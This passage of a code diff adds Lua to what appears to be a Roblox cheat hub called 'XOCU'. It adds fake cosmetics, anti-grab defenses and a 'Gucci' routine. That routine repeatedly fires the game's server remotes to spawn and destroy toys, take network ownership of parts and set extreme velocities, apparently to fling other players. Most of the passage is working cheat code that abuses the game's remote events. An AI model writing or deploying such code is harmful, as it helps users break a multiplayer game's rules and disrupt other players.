+        local head = char:FindFirstChild("Head")
+        if head then
+            local m = head:FindFirstChild("PhantomHeadlessMesh")
+            if m then m:Destroy() end
+            if SavedHeadData then
+                head.Transparency = SavedHeadData.Transparency
+                head.BrickColor = SavedHeadData.BrickColor
+                head.Material = SavedHeadData.Material
+                for _, m2 in ipairs(SavedHeadData.Meshes) do
+                    local mesh = Instance.new("SpecialMesh")
+                    mesh.MeshType = m2.MeshType
+                    mesh.MeshId = m2.MeshId
+                    mesh.TextureId = m2.TextureId
+                    mesh.Scale = m2.Scale
+                    mesh.Offset = m2.Offset
+                    mesh.VertexColor = m2.VertexColor
+                    mesh.Name = m2.Name
+                    mesh.Parent = head
+                end
+                for _, d in ipairs(SavedHeadData.Decals) do
+                    local decal = Instance.new("Decal")
+                    decal.Texture = d.Texture
+                    decal.Face = d.Face
+                    decal.Transparency = d.Transparency
+                    decal.Name = d.Name
+                    decal.Parent = head
+                end
+                SavedHeadData = nil
+            else
+                head.Transparency = 0
+            end
+        end
+        local rleg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
+        if rleg then
+            rleg.Transparency = 0
+            local w = rleg:FindFirstChildOfClass("WeldConstraint")
+            if w then w:Destroy() end
+        end
+        local fakeleg = char:FindFirstChild("PhantomKorbloxLeg")
+        if fakeleg then fakeleg:Destroy() end
+    end
+
+    LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(1)
+        SavedHeadData = nil
+        if FakeCosmeticsEnabled and RespawnPersist then ApplyCosmetics() end
+    end)
+
+    MainR:CreateToggle({
+        Name = "Enable Cosmetics",
+        Default = false,
+        Callback = function(v)
+            FakeCosmeticsEnabled = v
+            if v then
+                ApplyCosmetics()
+            else
+                StripCosmetics()
+            end
+        end
+    })
+
+    MainR:CreateDropdown({
+        Name = "Style",
+        Items = {"Headless", "Korblox", "Both"},
+        Default = "Both",
+        Callback = function(v)
+            CosmeticChoice = v
+            if FakeCosmeticsEnabled then StripCosmetics() ApplyCosmetics() end
+        end
+    })
+
+    MainR:CreateToggle({
+        Name = "Re-apply on Respawn",
+        Default = false,
+        Callback = function(v)
+            RespawnPersist = v
+        end
+    })
+end
+
+do
+
+    local Players = game:GetService('Players')
+    local UserInputService = game:GetService('UserInputService')
+    local SoundService = game:GetService('SoundService')
+    local TextChatService = game:GetService('TextChatService')
+    local player = Players.LocalPlayer
+
+    local soundMap = {
+        ['Normal Typing'] = 'rbxassetid://72486459002567',
+        ['Thocky Typing'] = 'rbxassetid://76696739955497',
+        ['Clean Typing'] = 'rbxassetid://131944804697356',
+        ['Clicky Typing'] = 'rbxassetid://9116149587',
+    }
+
+    local currentSoundId = soundMap['Normal Typing']
+    local typingSound = Instance.new('Sound')
+    typingSound.SoundId = currentSoundId
+    typingSound.Looped = true
+    typingSound.Volume = 1
+    typingSound.Parent = SoundService
+
+    local typing = false
+    local enabled = true
+    local volume = 100
+
+    local function startSound()
+        if not enabled then return end
+        if typingSound.SoundId and typingSound.SoundId ~= '' then
+            if not typingSound.IsPlaying then
+                typingSound:Play()
+            end
+        end
+    end
+
+    local function stopSound()
+        typingSound:Stop()
+    end
+
+    UserInputService.TextBoxFocused:Connect(function()
+        typing = true
+        startSound()
+    end)
+
+    UserInputService.TextBoxFocusReleased:Connect(function()
+        typing = false
+        stopSound()
+    end)
+
+    SoundGroup:CreateToggle({
+        Name = "Typing Sound",
+        Default = true,
+        Callback = function(state)
+            enabled = state
+            if not state then
+                stopSound()
+            end
+        end
+    })
+
+    SoundGroup:CreateSlider({
+        Name = "Volume",
+        Default = 100,
+        Min = 0,
+        Max = 100,
+        Callback = function(v)
+            volume = v
+            typingSound.Volume = v / 100
+        end
+    })
+
+    SoundGroup:CreateDropdown({
+        Name = "Typing Sound",
+        Items = {
+            "Normal Typing",
+            "Thocky Typing",
+            "Clean Typing",
+            "Clicky Typing",
+        },
+        Default = "Normal Typing",
+        Callback = function(selected)
+            local id = soundMap[selected]
+            if not id then return end
+            currentSoundId = id
+            typingSound:Stop()
+            typingSound.SoundId = id
+            typingSound.TimePosition = 0
+        end
+    })
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local PS = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local R = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = workspace
+local Player = PS.LocalPlayer
+local Camera = Workspace.CurrentCamera
+local CE = RS:WaitForChild("CharacterEvents", 10)
+local BeingHeld = Player:WaitForChild("IsHeld", 10)
+local StruggleEvent = CE and CE:WaitForChild("Struggle")
+function notify(title, content, duration)
+	Library:Notify({ Title = title or "Notification", Content = content or "", Duration = duration or 5,
+	 })
+end
+function sendHubLoadedMessage()
+	local message = " Owner Version | XOCU loaded. "
+	local sent = false
+	pcall(function()
+		local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+		if chatEvents then
+			local say = chatEvents:FindFirstChild("SayMessageRequest")
+			if say and typeof(say.FireServer) == "function" then
+				say:FireServer(message, "All")
+				sent = true
+			end
+		end
+	end)
+	if not sent then
+		pcall(function()
+			StarterGui:SetCore("ChatMakeSystemMessage", {
+				Name = message;
+				Color = Color3.fromRGB(255, 170, 0);
+				Font = Enum.Font.SourceSansBold;
+				FontSize = Enum.FontSize.Size18;
+			})
+		end)
+	end
+end
+task.spawn(function()
+	task.wait(1)
+	sendHubLoadedMessage()
+end)
+local paintPartsBackup = {}
+local paintConnections = {}
+function deleteAllPaintParts()
+	for _, obj in ipairs(Workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
+			local clone = obj:Clone()
+			clone.Archivable = true
+			paintPartsBackup[obj:GetDebugId()] = {
+				clone = clone,
+				parent = obj.Parent
+			}
+			obj:Destroy()
+		end
+	end
+end
+local function restorePaintParts()
+	for _, data in pairs(paintPartsBackup) do
+		if data.clone and data.parent then
+			data.clone.Parent = data.parent
+		end
+	end
+	paintPartsBackup = {}
+end
+local function watchNewPaintParts()
+	table.insert(paintConnections, Workspace.DescendantAdded:Connect(function(obj)
+		if obj:IsA("BasePart") and obj.Name == "PaintPlayerPart" then
+			task.defer(function()
+				if obj and obj.Parent then
+					local clone = obj:Clone()
+					clone.Archivable = true
+					paintPartsBackup[obj:GetDebugId()] = {
+						clone = clone,
+						parent = obj.Parent
+					}
+					obj:Destroy()
+				end
+			end)
+		end
+	end))
+end
+local function disconnectWatchers()
+	for _, conn in ipairs(paintConnections) do
+		if conn.Connected then
+			conn:Disconnect()
+		end
+	end
+	paintConnections = {}
+end
+local function setTouchQuery(state)
+	local char = Workspace:FindFirstChild(Player.Name)
+	if not char then
+		return
+	end
+	for _, v in ipairs(char:GetChildren()) do
+		if v:IsA("Part") or v:IsA("BasePart") then
+			v.CanTouch = state
+			v.CanQuery = state
+		end
+	end
+end
+local antiGucciConnection
+local safePosition
+local restoreFrames = 0
+local function spawnBlobman()
+	local args = {
+		[1] = "CreatureBlobman",
+		[2] = CFrame.new(0, 5000000, 0),
+		[3] = Vector3.new(0, 60, 0)
+	}
+	pcall(function()
+		ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(unpack(args))
+	end)
+	local folder = Workspace:WaitForChild(Player.Name .. "SpawnedInToys", 5)
+	if folder and folder:FindFirstChild("CreatureBlobman") then
+		local blob = folder.CreatureBlobman
+		if blob:FindFirstChild("Head") then
+			blob.Head.CFrame = CFrame.new(0, 50000, 0)
+			blob.Head.Anchored = true
+		end
+		notify("Success", "Blobman Spawned!", 3)
+	end
+end
+local function startAntiGucci()
+	local character = Player.Character or Player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	local rootPart = character:WaitForChild("HumanoidRootPart")
+	safePosition = rootPart.Position
+	local folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
+	local blob = folder and folder:FindFirstChild("CreatureBlobman")
+	local seat = blob and blob:FindFirstChild("VehicleSeat")
+	if not blob then
+		spawnBlobman()
+		task.wait(0.3)
+		folder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
+		blob = folder and folder:FindFirstChild("CreatureBlobman")
+		seat = blob and blob:FindFirstChild("VehicleSeat")
+	end
+	if seat and seat:IsA("VehicleSeat") then
+		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
+		seat:Sit(humanoid)
+	end
+	humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
+		if humanoid.Jump and humanoid.Sit then
+			restoreFrames = 15
+			safePosition = rootPart.Position
+		end
+	end)
+	if antiGucciConnection then
+		antiGucciConnection:Disconnect()
+	end
+	antiGucciConnection = R.Heartbeat:Connect(function()
+		if not rootPart or not humanoid then
+			return
+		end
+		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
+		if restoreFrames > 0 then
+			rootPart.CFrame = CFrame.new(safePosition)
+			restoreFrames = restoreFrames - 1
+		end
+	end)
+	task.spawn(function()
+		while humanoid.Sit do
+			task.wait(1)
+		end
+		task.wait(0.5)
+		rootPart.CFrame = CFrame.new(safePosition)
+	end)
+end
+local function stopAntiGucci()
+	if antiGucciConnection then
+		antiGucciConnection:Disconnect()
+		antiGucciConnection = nil
+	end
+	-- Unsit humanoid first so the server releases the seat
+	local char = Player.Character
+	local hum = char and char:FindFirstChild("Humanoid")
+	if hum then
+		hum.Sit = false
+		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+	end
+	local blobFolder = Workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
+	if blobFolder and blobFolder:FindFirstChild("CreatureBlobman") then
+		local blob = blobFolder.CreatureBlobman
+		-- Fire server-side destroy remote so it fully removes server-side
+		pcall(function()
+			ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob)
+		end)
+		task.wait(0.1)
+		-- Fallback local destroy in case remote didn't work
+		if blob and blob.Parent then
+			blob:Destroy()
+		end
+	end
+end
+local antiGucciConnectionTrain
+local safePositionTrain
+local restoreFramesTrain = 0
+local function startAntiGucciTrain()
+	local character = Player.Character or Player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	local rootPart = character:WaitForChild("HumanoidRootPart")
+	safePositionTrain = rootPart.Position
+	local folder = workspace.Map.AlwaysHereTweenedObjects
+	local train = folder and folder:FindFirstChild("Train")
+	local seat
+	if train then
+		for _, d in ipairs(train:GetDescendants()) do
+			if d:IsA("Seat") then
+				seat = d
+				break
+			end
+		end
+	end
+	if seat then
+		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
+		seat:Sit(humanoid)
+	end
+	humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
+		if humanoid.Jump and humanoid.Sit then
+			restoreFramesTrain = 15
+			safePositionTrain = rootPart.Position
+		end
+	end)
+	if antiGucciConnectionTrain then
+		antiGucciConnectionTrain:Disconnect()
+	end
+	antiGucciConnectionTrain = R.Heartbeat:Connect(function()
+		if not rootPart or not humanoid then
+			return
+		end
+		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
+		if restoreFramesTrain > 0 then
+			rootPart.CFrame = CFrame.new(safePositionTrain)
+			restoreFramesTrain = restoreFramesTrain - 1
+		end
+	end)
+	task.spawn(function()
+		while humanoid.Sit do
+			task.wait(1)
+		end
+		task.wait(0.5)
+		rootPart.CFrame = CFrame.new(safePositionTrain)
+	end)
+end
+local function stopAntiGucciTrain()
+	if antiGucciConnectionTrain then
+		antiGucciConnectionTrain:Disconnect()
+		antiGucciConnectionTrain = nil
+	end
+	local trainFolder = workspace.Map.AlwaysHereTweenedObjects
+	if trainFolder and trainFolder:FindFirstChild("Train") then
+		ResetPlayer(game.Players.LocalPlayer)
+	end
+end
+local DefenseGroup = Tabs.Defense:CreateBlock({Name = "Defense Main", Side = "Left"})
+local DefenseExtra = Tabs.Defense:CreateBlock({Name = "Extra Defense", Side = "Right"})
+
+local antiGrabExplosionConn, antiGrabHeldConn, antiGrabStruggleConn, antiGrabHumConn, antiGrabAnchorConn
+local antiGrabRootCF, antiGrabRootPos, antiGrabHardFreeze = nil, nil, false
+local function antiGrabUnfreeze(char)
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		hrp.Anchored = false
+		if hrp:FindFirstChild("FreezeJoint") then
+			hrp.FreezeJoint:Destroy()
+		end
+	end
+	antiGrabHardFreeze = false
+	if antiGrabAnchorConn then
+		antiGrabAnchorConn:Disconnect()
+		antiGrabAnchorConn = nil
+	end
+end
+local function antiGrabFreezeInPlace(char)
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+	if not hrp then
+		return
+	end
+	antiGrabRootCF = hrp.CFrame
+	antiGrabRootPos = hrp.Position
+	antiGrabHardFreeze = true
+	if not hrp:FindFirstChild("FreezeJoint") then
+		local align = Instance.new("AlignPosition")
+		align.Name = "FreezeJoint"
+		align.Mode = Enum.PositionAlignmentMode.OneAttachment
+		align.MaxForce = 1e6
+		align.MaxVelocity = 0
+		align.Responsiveness = 200
+		local att = Instance.new("Attachment", hrp)
+		align.Attachment0 = att
+		align.Position = antiGrabRootPos
+		align.Parent = hrp
+	end
+	antiGrabAnchorConn = R.Heartbeat:Connect(function()
+		if antiGrabHardFreeze and hrp then
+			hrp.AssemblyLinearVelocity = Vector3.zero
+			hrp.AssemblyAngularVelocity = Vector3.zero
+			hrp.CFrame = antiGrabRootCF
+		end
+	end)
+end
+local function antiGrabReconnect()
+	local char = Player.Character or Player.CharacterAdded:Wait()
+	local hum = char:WaitForChild("Humanoid")
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	local fp = hrp:FindFirstChild("FirePlayerPart")
+	if fp then
+		fp:Destroy()
+	end
+	if antiGrabHumConn then
+		antiGrabHumConn:Disconnect()
+	end
+	antiGrabHumConn = hum.Changed:Connect(function(p)
+		if p == "Sit" and hum.Sit then
+			if not (hum.SeatPart and tostring(hum.SeatPart.Parent) == "CreatureBlobman") then
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+				hum.Sit = false
+			end
+		end
+	end)
+end
+do
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local RunService = game:GetService("RunService")
+    local ContextActionService = game:GetService("ContextActionService")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- Localized state management (replaces getgenv and ACGE)
+    local antiGrabActive = false
+    local antiGrabConnection = nil
+    local spawnTick = nil
+
+    DefenseGroup:CreateToggle({
+        Name = "Seatless Gucci (Anti Grab)",
+        Flag = "SeatlessGucciAntiGrab",
+        Default = false,
+        Callback = function(Value)
+            if SetToggleState then SetToggleState("SeatlessGucciAntiGrab", Value) end
+            antiGrabActive = Value
+
+            if Value then
+                if not antiGrabConnection then
+                    antiGrabConnection = RunService.RenderStepped:Connect(function()
+                        if not antiGrabActive then return end
+                        
+                        local char = LocalPlayer.Character
+                        if not char then return end
+
+                        local hum = char:FindFirstChild("Humanoid")
+                        local root = char:FindFirstChild("HumanoidRootPart")
+                        local myToys = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
+                        local ocarina = myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")
+                        
+                        if ocarina then
+                            -- Check if we are currently being grabbed
+                            for _, prt in ipairs(char:GetChildren()) do
+                                local owner = prt:FindFirstChild("PartOwner")
+                                if owner and owner.Value ~= "" then
+                                    local holdPart = ocarina:FindFirstChild("HoldPart")
+                                    local holdFunc = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
+                                    
+                                    if holdFunc then
+                                        task.spawn(function()
+                                            pcall(function() holdFunc:InvokeServer(ocarina, char) end)
+                                        end)
+
+                                        local menuToys = ReplicatedStorage:FindFirstChild("MenuToys")
+                                        local destroyToy = menuToys and menuToys:FindFirstChild("DestroyToy")
+                                        if destroyToy then
+                                            pcall(function() destroyToy:FireServer(ocarina) end)
+                                        end
+                                        
+                                        if hum then
+                                            hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                                            hum.AutoRotate = true
+                                            if hum.Sit then
+                                                hum.Sit = false
+                                            end
+                                        end
+
+                                        pcall(function()
+                                            ContextActionService:UnbindAction("Escape")
+                                            ContextActionService:UnbindAction("JumpRemover")
+                                        end)
+                                        
+                                        owner.Value = ""
+                                    end
+                                end
+                            end
+                        else
+                            -- Spawn logic if Ocarina doesn't exist
+                            local canSpawn = LocalPlayer:FindFirstChild("CanSpawnToy")
+                            if canSpawn and canSpawn.Value and not spawnTick then
+                                spawnTick = tick()
+                                task.spawn(function()
+                                    local menuToys = ReplicatedStorage:FindFirstChild("MenuToys")
+                                    local spawnFunc = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction")
+                                    if spawnFunc then
+                                        pcall(function()
+                                            spawnFunc:InvokeServer(
+                                                "InstrumentWoodwindOcarina",
+                                                CFrame.new(1e5, 1e5, 1e5),
+                                                Vector3.zero
+                                            )
+                                        end)
+                                    end
+                                end)
+                            elseif spawnTick and tick() - spawnTick > 1 and not (myToys and myToys:FindFirstChild("InstrumentWoodwindOcarina")) then
+                                spawnTick = nil
+                            end
+
+                            -- Grab escape fallback
+                            local grabbed = false
+                            for _, prt in ipairs(char:GetChildren()) do
+                                local owner = prt:FindFirstChild("PartOwner")
+                                if owner and owner.Value ~= "" then
+                                    grabbed = true
+                                    break
+                                end
+                            end
+
+                            if grabbed then
+                                local charEvents = ReplicatedStorage:FindFirstChild("CharacterEvents")
+                                if charEvents then
+                                    local struggle = charEvents:FindFirstChild("Struggle")
+                                    local ragdollRemote = charEvents:FindFirstChild("RagdollRemote")
+                                    
+                                    if struggle then pcall(function() struggle:FireServer(LocalPlayer) end) end
+                                    if ragdollRemote and root then pcall(function() ragdollRemote:FireServer(root, 0) end) end
+                                end
+                                
+                                if hum and type(stopOcarinaAnim) == "function" then
+                                    pcall(stopOcarinaAnim, hum)
+                                end
+                            end
+                        end
+
+                        if hum and type(stopOcarinaAnim) == "function" then
+                            pcall(stopOcarinaAnim, hum)
+                        end
+                    end)
+                end
+            else
+                if antiGrabConnection then
+                    antiGrabConnection:Disconnect()
+                    antiGrabConnection = nil
+                end
+            end
+        end
+    })
+end
+local autoStruggleConn = nil
+local AntiGrabEnabled = false
+local HeldConnection = nil
+
+do
+    local RunService = game:GetService("RunService")
+    local AntiGrab = false
+    local AntiGrabProc = false
+    local AGWalk = false
+    local Cons = {}
+    
+    local function DiscAll()
+        for k, v in pairs(Cons) do
+            if v then v:Disconnect() end
+        end
+        table.clear(Cons)
+    end
+
+    local function ApplyAntiGrab(char)
+        if not char or not AntiGrab then return end
+        
+        local hrp = char:WaitForChild("HumanoidRootPart", 5)
+        local hum = char:WaitForChild("Humanoid", 5)
+        local head = char:WaitForChild("Head", 5)
+        local torso = char:WaitForChild("Torso", 5) or char:WaitForChild("UpperTorso", 5)
+        if not (hrp and hum and head and torso) then return end
+
+        local beingHeld = char:FindFirstChild("BeingHeld")
+        local wasRagdolled = false
+
+        Cons["AGCFrameLimbing"] = RunService.Heartbeat:Connect(function()
+            local ragdolled = hum:FindFirstChild("Ragdolled")
+            
+            if ragdolled and ragdolled.Value then
+                wasRagdolled = true
+                local leftArm = char:FindFirstChild("Left Arm")
+                local rightArm = char:FindFirstChild("Right Arm")
+                local leftLeg = char:FindFirstChild("Left Leg")
+                local rightLeg = char:FindFirstChild("Right Leg")
+
+                if leftArm then leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0, 0); leftArm.CanCollide = false end
+                if rightArm then rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0, 0); rightArm.CanCollide = false end
+                if leftLeg then leftLeg.CFrame = torso.CFrame * CFrame.new(-0.5, -2, 0); leftLeg.CanCollide = false end
+                if rightLeg then rightLeg.CFrame = torso.CFrame * CFrame.new(0.5, -2, 0); rightLeg.CanCollide = false end
+            elseif wasRagdolled then
+                wasRagdolled = false
+                local limbs = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
+                for _, limbName in ipairs(limbs) do
+                    local limb = char:FindFirstChild(limbName)
+                    if limb then limb.CanCollide = true end
+                end
+            end
+        end)
+
+        Cons["AGHead"] = head.ChildAdded:Connect(function(PartOwner)
+            if PartOwner.Name == "PartOwner" then
+                if not AntiGrabProc then
+                    AntiGrabProc = true
+                    hum.Sit = false
+                    
+                    pcall(function() StruggleEvent:FireServer(Player) end)
+                    
+                    task.spawn(function() 
+                        while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
+                            pcall(function() StruggleEvent:FireServer(Player) end)
+                            pcall(function() ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0) end)
+                            task.wait()
+                        end
+                    end)
+                    
+                    task.spawn(function()
+                        hrp.Anchored = true
+                        if not AGWalk then
+                            AGWalk = true
+                            pcall(function()
+                                while (head and head:FindFirstChild("PartOwner")) or (beingHeld and beingHeld.Value) do
+                                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
+                                    task.wait()
+                                end
+                            end)
+                        end
+                        hrp.Anchored = false
+                        AntiGrabProc = false
+                        AGWalk = false
+                    end)
+                end
+            end
+        end)
+        
+        local weldHRP = hrp:WaitForChild("WeldHRP", 5)
+        if weldHRP then
+            Cons["AGWeld"] = weldHRP.Changed:Connect(function()
+                if hrp.WeldHRP.Enabled then
+                    task.spawn(function()
+                        while hrp.WeldHRP.Enabled and task.wait() do
+                            hum.Sit = false
+                            hum.AutoRotate = true
+                            hum.HipHeight = 0
+                            pcall(function() head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0) end)
+                        end
+                        hum.HipHeight = 0
+                    end)
+                end
+            end)
+        end
+    end
+
+    DefenseGroup:CreateToggle({
+        Name = "Anti Grab BEST ",
+        Flag = "AntiGrab",
+        Default = false,
+        Callback = function(Value)
+            AntiGrab = Value
+            DiscAll()
+            
+            if AntiGrab then
+                ApplyAntiGrab(Player.Character)
+                Cons["AGChar"] = Player.CharacterAdded:Connect(ApplyAntiGrab)
+            else
+                local char = Player.Character
+                if char then
+                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                    if hrp then hrp.Anchored = false end
+                    
+                    local limbs = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
+                    for _, limbName in ipairs(limbs) do
+                        local limb = char:FindFirstChild(limbName)
+                        if limb then limb.CanCollide = true end
+                    end
+                end
+            end
+        end
+    })
+end
+
+RunService = game:GetService('RunService')
+Players = game:GetService('Players')
+ReplicatedStorage = game:GetService('ReplicatedStorage')
+DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
+SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
+GrabEvents = ReplicatedStorage.GrabEvents
+SetNetworkOwner = GrabEvents.SetNetworkOwner
+CharacterEvents = ReplicatedStorage.CharacterEvents
+RagdollRemote = CharacterEvents.RagdollRemote
+GUE = false
+GUTYPE = 'CreatureBlobman'
+inexistance = {}
+
+local itm
+local sp
+local sv
+local humconnection
+local LocalPlayer = game.Players.LocalPlayer
+
+local gucciTypes = {
+    ['Blobman'] = 'CreatureBlobman',
+    ['Tractor'] = 'TractorGreen',
+    ['Santa Sleigh'] = 'SantaSleigh'
+}
+
+local selectedGucciType = 'CreatureBlobman'
+
+function getCharParts()
+    local char = LocalPlayer.Character
+    if not char then
+        return nil, nil
+    end
+    return char:FindFirstChild('Humanoid'), char:FindFirstChild('HumanoidRootPart')
+end
+
+hum, hrp = getCharParts()
+
+local characterAddedConnection
+gucciRunning = false
+
+function diddle()
+    if itm then
+        for _, prt in pairs(itm:GetChildren())do
+            if prt:IsA('BasePart') then
+                prt.CanCollide = false
+            end
+        end
+    end
+    hrp.CFrame = sp
+    hrp.AssemblyLinearVelocity = sv
+    hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
+end
+
+function checkgrab(part)
+    pcall(function()
+        SetNetworkOwner:FireServer(part, part.CFrame)
+    end)
+end
+
+function gucciblob()
+    if gucciRunning then
+        return
+    end
+    gucciRunning = true
+
+    local guccion = false
+    local tickyticky = tick()
+
+    while GUE do
+        hum, hrp = getCharParts()
+
+        if hum and hrp then
+            local dt = tick() - tickyticky
+            tickyticky = tick()
+
+            if itm and itm:FindFirstChild('VehicleSeat') then
+                local occupant = itm.VehicleSeat.Occupant
+                if occupant and occupant ~= hum then
+                    task.spawn(function()
+                        DestroyToy:FireServer(itm)
+                    end)
+                    itm = nil
+                    guccion = false
+                    inexistance = {}
+                    task.wait(0.1)
+                    if LocalPlayer.CanSpawnToy.Value then
+                        task.spawn(function()
+                            SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
+                        end)
+                    end
+                    task.wait()
+                    continue
+                end
+            end
+
+            if itm and itm.Parent and not ((itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant ~= hum) or inexistance[itm] < 1) then
+                task.spawn(function()
+                    DestroyToy:FireServer(itm)
+                end)
+            else
+                local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')
+                itm = toyFolder and toyFolder:FindFirstChild(selectedGucciType)
+            end
+
+            if not sp or not hum.SeatPart then
+                sp = hrp.CFrame
+                sv = hrp.AssemblyLinearVelocity
+            end
+
+            if humconnection ~= hum then
+                humconnection = hum
+                hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
+            end
+
+            local wait = true
+
+            if itm then
+                inexistance[itm] = (inexistance[itm] or 0) + dt
+
+                if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
+                    if not guccion then
+                        (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    end
+
+                    local diddy = itm.VehicleSeat
+                    diddy.Parent = nil
+                    diddy.Parent = itm
+
+                    if not checkgrab(itm) and (hrp.CFrame.Position - (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).CFrame.Position).Magnitude < 28 then
+                        for _, prt in pairs(itm:GetChildren())do
+                            if prt:IsA('BasePart') and prt.CanQuery then
+                                SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position))
+                            end
+                        end
+                    end
+
+                    if not hum.SeatPart then
+                        hum.Sit = false
+                    else
+                        wait = false
+                        task.wait()
+                    end
+
+                    if hrp and hum and (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
+                        local ragdolled = hum:FindFirstChild('Ragdolled')
+                        if ragdolled and ragdolled.Value then
+                            guccion = false
+                        end
+
+                        if itm.VehicleSeat.Occupant == hum then
+                            guccion = true
+                        elseif not guccion then
+                            task.wait()
+                            wait = false
+                            if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
+                                local ragdolled2 = hum:FindFirstChild('Ragdolled')
+                                if not ragdolled2 or not ragdolled2.Value then
+                                    itm.VehicleSeat:Sit(hum)
+                                    RagdollRemote:FireServer(hrp, 0.016)
+                                end
+                            end
+                        end
+
+                        if guccion then
+                            (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 1e15, 0)
+                        else
+                            if inexistance[itm] >= game.Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 250 then
+                                task.spawn(function()
+                                    DestroyToy:FireServer(itm)
+                                end)
+                                hum.Sit = true
+                            end
+                        end
+                    end
+                else
+                    if guccion then
+                        hum.Sit = true
+                    end
+                    guccion = false
+                    if inexistance[itm] >= 1 then
+                        task.spawn(function()
+                            DestroyToy:FireServer(itm)
+                        end)
+                        if LocalPlayer.CanSpawnToy.Value then
+                            task.spawn(function()
+                                SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
+                            end)
+                        end
+                    end
+                end
+            else
+                if guccion then
+                    guccion = false
+                    hum.Sit = true
+                end
+                if LocalPlayer.CanSpawnToy.Value then
+                    task.spawn(function()
+                        SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
+                    end)
+                end
+            end
+
+            if wait then
+                task.wait()
+                hum.Sit = false
+            end
+        else
+            task.wait()
+        end
+    end
+    gucciRunning = false
+end
+
+function onCharacterAdded(char)
+    if not GUE then
+        return
+    end
+    if itm and itm.Parent then
+        task.spawn(function()
+            DestroyToy:FireServer(itm)
+        end)
+    end
+    itm = nil
+    inexistance = {}
+    humconnection = nil
+    sp = nil
+    sv = nil
+    gucciRunning = false
+
+    char:WaitForChild('Humanoid', 10)
+    char:WaitForChild('HumanoidRootPart', 10)
+
+    hum, hrp = getCharParts()
+    task.wait(0.5)
+    task.spawn(gucciblob)
+end
+
+if characterAddedConnection then
+    characterAddedConnection:Disconnect()
+end
+
+characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+
+DefenseGroup:CreateDropdown({
+    Name = "Gucci Type",
+    Items = {"Blobman", "Tractor", "Santa Sleigh"},
+    Default = "Blobman",
+    Callback = function(Value)
